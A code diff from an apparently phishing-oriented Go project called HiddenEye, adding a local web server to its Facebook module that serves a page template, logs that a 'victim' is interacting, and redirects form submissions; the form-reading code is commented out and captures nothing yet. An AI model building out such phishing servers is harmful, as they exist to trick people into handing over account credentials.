@@ -4,6 +4,9 @@ import (
 	"HiddenEye/helpers"
 	Colors "HiddenEye/utils"
 	"fmt"
+	"html/template"
+	"net/http"
+	"strconv"
 )
 
 func Facebook() {
@@ -104,10 +107,56 @@ func Facebook() {
 				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Hidden Eye is Listening to https://localhost:", port)
 				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Waiting for the target to Interact")
 
+				handlerPhising(port)
 			}
 
 		}
 
 	}
 
+}
+
+var tpl *template.Template
+
+func init() {
+	tpl = template.Must(template.ParseGlob("templates/*.gohtml"))
+}
+
+func handlerPhising(p int) {
+	port := strconv.Itoa(p)
+	http.HandleFunc("/", index)
+	http.HandleFunc("/process", processor)
+	http.ListenAndServe(":"+port, nil)
+}
+
+func index(w http.ResponseWriter, r *http.Request) {
+	fmt.Println("\n\n  " + Colors.Red() + " [+] " + Colors.White() + "  Victum is interacting with the server")
+	tpl.ExecuteTemplate(w, "index.gohtml", nil)
+}
+
+func processor(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Redirect(w, r, "/", http.StatusSeeOther)
+		return
+	}
+
+	// fname := r.FormValue("firster")
+	// lname := r.FormValue("laster")
+	// surf := r.FormValue("surf")
+	// snow := r.FormValue("snow")
+	// skate := r.FormValue("skate")
+	// radio := r.FormValue("cow")
+
+	// d := struct {
+	// 	First, Last, Surf, Snow, Skate, Radio string
+	// }{
+	// 	First: fname,
+	// 	Last:  lname,
+	// 	Surf:  surf,
+	// 	Snow:  snow,
+	// 	Skate: skate,
+	// 	Radio: radio,
+	// }
+
+	http.Redirect(w, r, "http://www.golang.org", http.StatusSeeOther)
 }
